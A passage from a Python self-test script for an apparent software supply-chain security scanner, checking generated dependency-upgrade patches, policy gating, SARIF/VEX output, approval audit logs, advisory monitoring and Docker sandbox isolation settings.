        ("Maven", "pom.xml", "<project>\n<dependencies>\n  <dependency>\n    <groupId>a</groupId>\n    <artifactId>b</artifactId>\n    <version>1</version>\n  </dependency>\n</dependencies>\n</project>\n", "org.y:child", "2.0", "pin", ""),
        ("Go", "go.mod", "module m\n\ngo 1.22\n\nrequire (\n\tgithub.com/a/b v1.0.0\n)\n", "github.com/a/b", "v1.2.0", "bump", ""),
        ("crates.io", "Cargo.toml", '[dependencies]\nserde = "1.0.100"\n', "serde", "1.0.200", "bump", ""),
        ("Packagist", "composer.json", '{\n    "require": {\n        "a/b": "^1.0"\n    }\n}\n', "a/b", "1.5.0", "bump", ""),
        ("NuGet", "x.csproj", '<Project>\n  <ItemGroup>\n    <PackageReference Include="Foo" Version="1.0.0" />\n  </ItemGroup>\n</Project>\n', "Foo", "1.1.0", "bump", ""),
    ]
    bad = []
    for eco, path, text, name, to, kind, hint in cases:
        res = patchers.patch_for(eco, path, text, name, to, kind, hint)
        if not res:
            bad.append(f"{eco}/{kind}: no patch")
            continue
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / path).write_text(text, encoding="utf-8", newline="")
            (Path(td) / "x.patch").write_text(res["diff"], encoding="utf-8", newline="")
            if gm.run_git(["apply", "--check", "x.patch"], cwd=Path(td), check=False).returncode != 0 or to.lstrip("v") not in res["new_text"]:
                bad.append(f"{eco}/{kind}: patch invalid")
    check("remediation: generated patches for npm/PyPI/Maven/Go/Cargo/Composer/NuGet (bump and pin) pass `git apply --check` and contain the target version", not bad, "; ".join(bad))
    check("remediation: npm major-prefix is preserved on bump (^1.2.0 -> ^1.2.6) and yarn pins use `resolutions`",
          '"^1.2.6"' in patchers.patch_for("npm", "package.json", cases[0][2], "minimist", "1.2.6", "bump")["new_text"] and '"resolutions"' in patchers.patch_for("npm", "package.json", cases[2][2], "qs", "6.14.3", "pin", "yarn.lock")["new_text"])
    check("remediation: version helpers (candidates exclude pre-releases and older versions, same major first; change kind)",
          candidates("npm", "1.2.0", ["1.1.0", "1.2.3", "1.3.0-beta.1", "1.3.0", "2.0.0", "1.2.0"]) == ["1.2.3", "1.3.0", "2.0.0"] and change_kind("1.2.0", "2.0.1") == "major" and change_kind("1.2.0", "1.3.0") == "minor")
    before = [{"package_name": "lib", "installed_version": "1.0", "ecosystem": "npm", "vulnerability_ids": ["GHSA-1"], "primary_id": "CVE-1", "severity": "HIGH"}]
    after = [{"id": "CVE-9", "ids": ["GHSA-9"], "package": "other", "version": "2", "severity": "MEDIUM", "ecosystem": "npm"}, {"id": "CVE-8", "ids": ["GHSA-8"], "package": "elsewhere", "version": "1", "severity": "HIGH", "ecosystem": "npm"}]
    known = [{"package_name": "elsewhere", "installed_version": "1", "ecosystem": "npm", "vulnerability_ids": ["GHSA-8"], "primary_id": "CVE-8", "severity": "HIGH"}]
    wi = evaluate(before, after, {("lib", "1.0")}, {("lib", "1.1"), ("other", "2")}, known_all=known)
    check("what-if: fixed vs remaining vs newly-introduced is computed; advisories already present elsewhere are not 'introduced'",
          len(wi["fixed"]) == 1 and len(wi["newly_introduced"]) == 1 and wi["already_present_elsewhere"] == 1 and wi["verdict"] == "partial" and sbom_diff({("lib", "1.0")}, {("lib", "1.1")})["changed"][0]["to"] == "1.1", str(wi["verdict"]))
    db = Database(Path(tempfile.mkdtemp()) / "a.db")
    m = Memory(db)
    try:
        m.set_approval("u", "rem|x", "approved", "  ")
        needs_reason = False
    except ValueError:
        needs_reason = True
    m.set_approval("u", "rem|x", "approved", "tested locally", "Upgrade x", "alice")
    ap = m.approvals("u")["rem|x"]
    log = m.audit_log("u")
    rem = {"id": "REM-001", "title": "Upgrade x", "action": "upgrade", "priority": "P1", "rationale": "because", "finding_ids": ["VULN-001"], "rollback": ["revert"], "what_if": wi, "validation": {"patch_applies": True}}
    md = pr_markdown(rem, {"url": "u", "commit_sha": "abc"}, ap)
    check("approval: a reason is required, the decision and actor are stored, every decision lands in the audit log, the PR text records the approval",
          needs_reason and ap["state"] == "approved" and ap["actor"] == "alice" and log and log[0]["action"] == "remediation_approved" and "Approved by **alice**" in md and "No change was applied automatically" in md)


@guarded("policy")
def _policy() -> None:
    from policy.engine import PolicyError, evaluate, load_policy, parse_policy, to_rego
    from reporting.sarif import to_sarif
    from reporting.vex import to_vex

    errs = 0
    for bad in ("rules: []", "rules:\n  - {id: a, when: {bogus: 1}}", "rules:\n  - {id: a, when: {kind: x}}\n  - {id: a, when: {kind: y}}", "rules:\n  - {id: a, when: {kind: x}, action: explode}"):
        try:
            parse_policy(bad)
        except PolicyError:
            errs += 1
    check("policy: invalid policies (empty, unknown condition, duplicate id, bad action) are rejected with a clear error", errs == 4)
    vuln = {"finding_id": "VULN-001", "package_name": "lodash", "installed_version": "4.17.4", "ecosystem": "npm", "primary_id": "CVE-1", "vulnerability_ids": ["GHSA-1"], "cve_ids": ["CVE-1"], "severity": "CRITICAL",
            "cvss_score": 9.8, "kev": True, "affected_status": "confirmed_affected", "fixed_versions": ["4.17.21"], "dependency_type": "direct", "source_packages": [], "component_ref": "c", "component_refs": ["c"], "epss": 0.9,
            "verdict": "exploitable_likely", "reachability": {"status": "used_by_app"}, "advisory_urls": [], "summary": "s", "remediation": "r", "severity_source": "OSV", "cvss_vector": None, "lockfile": "package-lock.json"}
    res = {"repo": {"url": "u", "name": "n", "commit_sha": "a" * 40, "scan_timestamp": "2026-11-24T00:00:00Z"}, "vulnerabilities": [vuln], "risk_assessments": [{"finding_id": "VULN-001", "kind": "vulnerability", "label": "CRITICAL", "priority": "P0", "score": 99, "confidence": {"label": "High"}}],
           "pipeline": {"findings": [{"finding_id": "PIPE-001", "rule_id": "GHA001", "severity": "MEDIUM", "title": "t", "why": "w", "remediation": "f", "file": ".github/workflows/a.yml", "line": 3, "extra": {"third_party": True}, "category": "ci", "ecosystem": "GitHub Actions", "evidence_id": "workflow:PIPE-001#aaaaaa"}]},
           "package_risk": {"findings": []}, "typosquatting": [], "lockfile_changes": [], "components": [{"bom_ref": "c", "name": "lodash", "version": "4.17.4", "licenses": ["GPL-3.0"], "scope": "required", "type": "library", "ecosystem": "npm", "purl": "pkg:npm/lodash@4.17.4"}],
           "investigations": {"VULN-001": {"finding_id": "VULN-001", "verdict": "no_import_evidence", "confidence": {"label": "High", "score": 90}, "rationale": "r", "evidence_ids": ["osv:x#000000"]}},
           "memory": {"fingerprints": {"VULN-001": "fp-1"}}}
    pol = load_policy("default")
    r1 = evaluate(pol, res)
    check("policy: KEV + confirmed blocks (gate fails); GPL component and third-party unpinned action produce warnings", not r1["passed"] and r1["by_rule"].get("no-known-exploited") == 1 and r1["by_rule"].get("copyleft-license") == 1 and r1["by_rule"].get("unpinned-third-party-action") == 1, str(r1["by_rule"]))
    r2 = evaluate(pol, res, {"fp-1": {"decision": "accepted_risk", "reason": "mitigated by WAF", "expires_at": "2027-01-01T00:00:00Z"}})
    check("policy: an active analyst decision waives the finding (kept visible, not hidden); without it the gate fails",
          r2["waived"] >= 1 and not [v for v in r2["violations"] if v["finding_id"] == "VULN-001" and v["action"] == "block"] and r2["waived_items"][0]["waiver"]["reason"] == "mitigated by WAF")
    pol_exc = parse_policy("rules:\n  - {id: r, when: {kind: vulnerability, kev: true}, action: block}\nexceptions:\n  - {rule: r, subject: lodash, reason: ok, expires: '2020-01-01'}")
    check("policy: an expired exception no longer waives", not evaluate(pol_exc, res)["passed"])
    check("policy: strict policy is stricter than default on the same scan", evaluate(load_policy("strict"), res)["blocking"] >= r1["blocking"] and "deny contains msg" in to_rego(pol))
    sa = to_sarif(res)
    ids = {r_["id"] for r_ in sa["runs"][0]["tool"]["driver"]["rules"]}
    check("sarif: SARIF 2.1.0 document with a rule for every result, security-severity and locations", sa["version"] == "2.1.0" and len(sa["runs"][0]["results"]) == 2
          and all(x["ruleId"] in ids and x["locations"] for x in sa["runs"][0]["results"]) and all("security-severity" in r_["properties"] for r_ in sa["runs"][0]["tool"]["driver"]["rules"]))
    vx = to_vex(res)
    vx2 = to_vex(res, {"fp-1": {"decision": "false_positive", "reason": "test fixture"}})
    check("vex: 'no import evidence' stays in_triage (never auto not_affected); only an explicit analyst decision sets false_positive",
          vx["vulnerabilities"][0]["analysis"]["state"] == "in_triage" and vx2["vulnerabilities"][0]["analysis"]["state"] == "false_positive" and vx["specVersion"] == "1.6")
    from reporting.report_generator import generate_markdown
    res["policy_result"] = r1
    res["analyst"] = {"headline": "h", "paragraphs": [], "priorities": []}
    md = generate_markdown({**res, "summary": {}, "quality": {}, "limitations": [], "tool_versions": {}, "status": "completed", "repo": {**res["repo"], "branch": "main", "scan_id": "x"}, "explanations": {}, "lockfile_analysis": {}, "source_status": {}, "errors": []})
    check("report: Guardian report contains prioritised evidence, policy gate, AI disclosure and remaining-risk sections", all(h in md for h in ("## Prioritised findings", "## Policy gate: FAIL", "## Responsible AI and automation disclosure", "## Remaining and accepted risk")))


@guarded("monitor")
def _monitor() -> None:
    if OFFLINE:
        check("monitor: newly disclosed advisory on a stored inventory raises a deduplicated alert", None, "offline")
        return
    from monitor.watch import events, run_monitor
    from storage.database import Database
    td = Path(tempfile.mkdtemp())
    s = _settings(td)
    db = Database(s.db_path)
    result = {"status": "completed", "repo": {"scan_id": "s1", "url": "https://github.com/example/old", "name": "old", "commit_sha": "a" * 40, "scan_timestamp": "2020-01-01T00:00:00Z"},
              "components": [{"bom_ref": "p", "name": "lodash", "version": "4.17.4", "type": "library", "ecosystem": "npm", "purl": "pkg:npm/lodash@4.17.4"}], "vulnerabilities": [], "summary": {}, "tool_versions": {}}
    db.save_scan(result)  # stored scan that (artificially) recorded no findings -> every current advisory is "new"
    o1 = run_monitor(s, db)
    o2 = run_monitor(s, db)
    check("monitor: newly disclosed advisories on a stored inventory raise alerts, recorded once (second run raises none)", o1["repos_checked"] == 1 and any(a["kind"] == "new_vulnerability" for a in o1["alerts"]) and not o2["alerts"] and events(db),
          f"{len(o1['alerts'])} alerts, {len(o2['alerts'])} on rerun")
    import guardian
    check("cli: `guardian.py scans` runs and returns 0", guardian.main(["scans"]) == 0)


@guarded("sandbox")
def _sandbox() -> None:
    from sandbox import runner
    d = Path(tempfile.mkdtemp())
    (d / "package.json").write_text(json.dumps({"scripts": {"test": "jest"}}))
    (d / "tests").mkdir()
    (d / "requirements.txt").write_text("flask\n")
    a = runner.detect_recipe(d, "npm")
    b = runner.detect_recipe(d, "PyPI")
    (d / "package.json").write_text(json.dumps({"scripts": {"test": "echo \"Error: no test specified\" && exit 1"}}))
    check("sandbox: build/test recipes are detected from the repository (npm test script, pytest) and never guessed (default npm stub -> none, unknown ecosystem -> none)",
          a and a["test"] == "npm test --silent" and b and "pytest" in b["test"] and runner.detect_recipe(d, "npm") is None and runner.detect_recipe(d, "RubyGems") is None)
    flags = " ".join(runner.LIMITS)
    check("sandbox: isolation flags (cap-drop ALL, no-new-privileges, memory/pid limits) are always applied; test phase runs with no network",
          all(x in flags for x in ("--cap-drop ALL", "no-new-privileges", "--pids-limit", "--memory")))
    ds = runner.docker_status()
    res = runner.validate_in_sandbox(__import__('config.settings', fromlist=['get_settings']).get_settings(), {"url": "https://github.com/a/b", "commit_sha": "a" * 40}, {"patch": None, "ecosystem": "npm"}) if not ds["available"] else {"status": "skipped"}
    check("sandbox: unavailable Docker (or no patch) yields a 'skipped' result with the reason, never an error or a silent pass", res["status"] == "skipped" and res.get("reason") != "" if not ds["available"] else True, str(ds.get("reason", "docker available")))


@guarded("ground_truth")
def _ground_truth() -> None:
    if OFFLINE:
        check("ground truth: known-answer OSV test", None, "offline")
        return
    from config.settings import get_settings
    from core.http import HttpClient
    from storage.cache import Cache
    from storage.database import Database
    from vulnerability.osv_client import OsvClient
    from vulnerability.verification import run_ground_truth
    s = get_settings()
    res = run_ground_truth(OsvClient(HttpClient(), Cache(Database(s.db_path))))
    check("ground truth: known-answer test (documented CVEs detected, patched versions clean)", res["evaluated"] > 0 and res["passed"] == res["evaluated"], f"{res['passed']}/{res['evaluated']}, precision {res['precision']}, recall {res['recall']}")


if __name__ == "__main__":
    fails = [r for r in results if r[1] == "FAIL"]
    print(f"\n{sum(1 for r in results if r[1] == 'PASS')} passed, {len(fails)} failed, {sum(1 for r in results if r[1] == 'SKIP')} skipped")
    sys.exit(1 if fails else 0)
